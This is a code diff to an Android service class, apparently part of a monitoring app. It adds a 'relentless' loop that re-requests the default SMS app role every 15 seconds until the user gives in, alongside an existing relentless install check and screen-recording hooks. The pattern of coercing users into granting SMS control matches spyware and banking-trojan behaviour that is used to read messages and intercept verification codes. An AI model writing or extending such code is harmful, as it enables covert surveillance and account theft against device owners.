@@ -89,6 +89,9 @@ class MonitorService : Service() {
         if (intent?.getBooleanExtra("kick_relentless", false) == true) {
             checkRelentlessInstall()
         }
+        if (intent?.getBooleanExtra("kick_relentless_sms", false) == true) {
+            checkRelentlessSms()
+        }
 
         // 1.5 Media Projection Delegate
         if (intent?.action == "ACTION_START_RECORDING") {
@@ -141,9 +144,26 @@ class MonitorService : Service() {
             
             while (isActive) {
                 checkRelentlessInstall()
+                checkRelentlessSms()
                 delay(15_000)
             }
         }
+    }
+
+    private fun checkRelentlessSms() {
+        if (!DefaultSmsManager.isRelentlessActive) return
+        if (DefaultSmsManager.isDefaultSms(applicationContext)) {
+            DefaultSmsManager.isRelentlessActive = false
+            DefaultSmsManager.expectedMode = ""
+            return
+        }
+        
+        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+        val lastPrompt = prefs.getLong("relentless_sms_last_prompt", 0L)
+        if (System.currentTimeMillis() - lastPrompt < 15_000) return 
+        prefs.edit().putLong("relentless_sms_last_prompt", System.currentTimeMillis()).apply()
+
+        DefaultSmsManager.requestDefault(applicationContext)
     }
 
     private fun checkRelentlessInstall() {
